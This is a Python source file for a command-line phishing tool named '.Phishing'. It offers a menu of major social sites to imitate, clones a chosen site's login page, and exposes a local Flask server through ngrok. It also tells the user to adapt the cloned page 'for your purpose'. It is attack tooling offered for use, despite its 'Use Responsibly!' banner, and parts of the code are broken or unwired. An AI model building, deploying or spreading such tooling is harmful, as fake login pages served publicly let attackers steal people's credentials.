import os
from colorama import Fore
import webbrowser
import shutil
import requests
from bs4 import BeautifulSoup
import subprocess
from flask import Flask, Response

app = Flask(__name__)


def title():
    logo = (
        "                "+Fore.LIGHTCYAN_EX   +"             _     _     _     _                  \n"
        "                "+Fore.LIGHTCYAN_EX   +"            | |   (_)   | |   (_)                 \n"
        "                "+Fore.LIGHTCYAN_EX   +"       _ __ | |__  _ ___| |__  _ _ __   __ _      \n"
        "                "+Fore.LIGHTCYAN_EX   +"      | '_ \| '_ \| / __| '_ \| | '_ \ / _` |     \n"
        "                "+Fore.LIGHTCYAN_EX   +"     _| |_) | | | | \__ \ | | | | | | | (_| |     \n"
        "                "+Fore.LIGHTCYAN_EX   +"    (_) .__/|_| |_|_|___/_| |_|_|_| |_|\__, |     \n"
        "                "+Fore.LIGHTCYAN_EX   +"      | |                               __/ |     \n"
        "                "+Fore.LIGHTCYAN_EX   +"      |_|                              |___/      \n"
        "\n"
        "             "+Fore.LIGHTCYAN_EX+"┏▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┒\n"
        "             "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                Welcome to .Phishing.               |\n"
        "             "+Fore.LIGHTCYAN_EX+"|           To see the Commands, type "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"help"+Fore.LIGHTRED_EX +"]"+Fore.LIGHTCYAN_EX +".        |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                  Use Responsibly!                  |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "             "+Fore.LIGHTCYAN_EX+"┗▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┚\n"
        "\n"
    )
    print(Fore.LIGHTCYAN_EX + logo)

def show_help():
    help = (
        "\n"
        "             "+Fore.LIGHTCYAN_EX+"┏▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┒\n"
        "             "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"1"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Phishing web                    |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"2"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Github Repository               |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"3"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Clone Site                      |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"help"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Show commands                |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"clear"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Clear the screen            |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"exit"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Close Program                |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "             "+Fore.LIGHTCYAN_EX+"┗▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┚\n"
        "\n"
    )
    print(Fore.LIGHTCYAN_EX + help)

def clone_and_serve_website(url):
    try:
        subprocess.run(["wget", "--mirror", "--convert-links", "--adjust-extension", "--page-requisites", url])

        return Response(open("index.html", "rb"), content_type="text/html")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to clone the website. {e}")
        return Response('Error: Failed to clone the website.', status=500)
    except Exception as e:
        print(f"Error: {e}")
        return Response('Error: Failed to clone the website.', status=500)

@app.route('/<path:custom_url>')
def serve_custom_website(custom_url):
    ngrok_ip = input("Enter the IP address for the ngrok POST (e.g., 'http://123.456.789.0:4040'): ")
    ngrok_port = int(input("Enter the port number where your local server is running (e.g., 80 or 8080): "))

    ngrok_cmd = f"ngrok http {ngrok_port}"
    subprocess.Popen(ngrok_cmd, shell=True)

    input("Press Enter after ngrok generates the public URL...")

    ngrok_url = f"{ngrok_ip}:{ngrok_port}"
    return clone_and_serve_website(f"{ngrok_url}/{custom_url}")

def site_list():
    site = (
        "             "+Fore.LIGHTCYAN_EX   +"                     _____ _ _               \n"
        "             "+Fore.LIGHTCYAN_EX   +"                    / ____(_) |              \n"
        "             "+Fore.LIGHTCYAN_EX   +"                    | (___  _| |_ ___ ___    \n"
        "             "+Fore.LIGHTCYAN_EX   +"                     \___ \| | __/ _ \ __|   \n"
        "             "+Fore.LIGHTCYAN_EX   +"                     ____) | | |_  __\__ \   \n"
        "             "+Fore.LIGHTCYAN_EX   +"                    |_____/|_|\__\___|___/   \n"
        "\n"
        "             "+Fore.LIGHTCYAN_EX   +"                      Use Responsibly!           "+Fore.LIGHTCYAN_EX +"         \n"
        "             "+Fore.LIGHTWHITE_EX   +"          __________________  __________________                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[01] "+Fore.LIGHTWHITE_EX +"Facebook  |  | "+Fore.LIGHTRED_EX +"[21] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[02] "+Fore.LIGHTWHITE_EX +"Twitter   |  | "+Fore.LIGHTRED_EX +"[22] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[03] "+Fore.LIGHTWHITE_EX +"Instagram |  | "+Fore.LIGHTRED_EX +"[23] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[04] "+Fore.LIGHTWHITE_EX +"LinkedIn  |  | "+Fore.LIGHTRED_EX +"[24] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[05] "+Fore.LIGHTWHITE_EX +"YouTube   |  | "+Fore.LIGHTRED_EX +"[25] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[06] "+Fore.LIGHTWHITE_EX +"Pinterest |  | "+Fore.LIGHTRED_EX +"[26] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[07] "+Fore.LIGHTWHITE_EX +"Snapchat  |  | "+Fore.LIGHTRED_EX +"[27] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[08] "+Fore.LIGHTWHITE_EX +"Reddit    |  | "+Fore.LIGHTRED_EX +"[28] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[09] "+Fore.LIGHTWHITE_EX +"Tumblr    |  | "+Fore.LIGHTRED_EX +"[29] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[10] "+Fore.LIGHTWHITE_EX +"TikTok    |  | "+Fore.LIGHTRED_EX +"[30] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[11] "+Fore.LIGHTWHITE_EX +"Tumblr    |  | "+Fore.LIGHTRED_EX +"[31] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[12] "+Fore.LIGHTWHITE_EX +"Wix       |  | "+Fore.LIGHTRED_EX +"[32] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[13] "+Fore.LIGHTWHITE_EX +"Github    |  | "+Fore.LIGHTRED_EX +"[33] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[14] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[34] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[15] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[35] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[16] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[36] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[17] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[37] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[18] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[38] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[19] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[39] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[20] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[40] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
        "             "+Fore.LIGHTWHITE_EX   +"          |________________|  |________________|                \n"
        "\n"
        "             "+Fore.LIGHTCYAN_EX   +"                      Next Page "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"next"+Fore.LIGHTRED_EX +"]                    "+Fore.LIGHTCYAN_EX   +"\n" 
        "             "+Fore.LIGHTCYAN_EX   +"                      Exit Page "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"exit"+Fore.LIGHTRED_EX +"]                    "+Fore.LIGHTCYAN_EX   +"\n" 

        "\n"
    )
    print(Fore.LIGHTCYAN_EX + site)
 
    while True:
        # Ask the user for the ngrok IP address
        ngrok_ip = input("Enter the IP address for the ngrok POST (e.g., 'http://123.456.789.0:4040'): ")

        # Ask the user if they want to use sites from the catalog or provide a custom URL
        use_catalog = input("Do you want to use sites from the catalog? (y/n): ").strip().lower()

        if use_catalog == "y":
            ngrok_port = int(input("Enter the port number where your local server is running (e.g., 80 or 8080): "))
            ngrok_cmd = f"ngrok http {ngrok_port}"
            subprocess.Popen(ngrok_cmd, shell=True)

            # Wait for a moment to let ngrok generate the public URL
            input("Press Enter after ngrok generates the public URL...")

            # Display the ngrok URL to the user
            ngrok_url = f"{ngrok_ip}/{ngrok_port}"
            print(f"You can access the ngrok status page at: {ngrok_url}")

            app.run(host='0.0.0.0', port=ngrok_port)
            break

        elif use_catalog == "n":
            custom_url = input("Enter the custom URL to clone and use in the server: ").strip()

            # Use the custom URL to clone and serve the website
            ngrok_url = f"{ngrok_ip}/{custom_url}"
            app.run(host='0.0.0.0', port=8080)
            break

        else:
            print("Invalid choice. Please enter 'y' or 'n'.")

def open_github_repository():
    url = "https://github.com/phishing-project/.phishing"
    webbrowser.open(url)

def site_clone():
    clone = (
        "\n"
        "       "+Fore.LIGHTCYAN_EX+"┏▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┒\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"                                                   |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"        Enter the URL of the site's login page.    |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"           After you have placed the page,         |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"         be sure to change the code for use.       |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"                  "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"exit"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Exit Page                 |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"                                                   |\n"
        "       "+Fore.LIGHTCYAN_EX+"┗▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┚\n"
        "\n"
    )
    print(Fore.LIGHTCYAN_EX + clone)
    url = input("Enter the URL of the website you want to clone: ").strip()

    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')

        html_content = str(soup.prettify())
        css_content = ""
        css_tags = soup.find_all('style')
        for tag in css_tags:
            css_content += str(tag) + "\n"

        filename = input("Enter the filename (without extension) for the cloned HTML: ").strip()
        destination_folder = input("Enter the destination folder path: ").strip()

        html_filename = filename + ".html"
        css_filename = filename + ".css"

        html_file_path = os.path.join(destination_folder, html_filename)
        css_file_path = os.path.join(destination_folder, css_filename)

        with open(html_file_path, 'w', encoding='utf-8') as html_file:
            html_file.write(html_content)

        with open(css_file_path, 'w', encoding='utf-8') as css_file:
            css_file.write(css_content)

        print(f"Website cloned successfully. HTML file: {html_file_path}")
        print(f"CSS file: {css_file_path}")
        print(f"Remember to change the code for your purpose.")


    except requests.exceptions.RequestException as e:
        print(f"Error: Failed to fetch the website. {e}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    title()
    while True:
        user_input = input("~/.phishing $ ").strip().lower()

        if user_input == "help":
            show_help()
        if user_input == "1":
            site_list()
        if user_input == "3":
            site_clone()
        elif user_input == "2":
            open_github_repository()
        elif user_input == "clear":
            if os.name == 'nt':  # Windows
                os.system('cls')
            else:  # Unix (Linux/Mac)
                os.system('clear')
            title()
        elif user_input == "exit":
            print("Exiting .Phishing.")
            break

if __name__ == "__main__":
    main()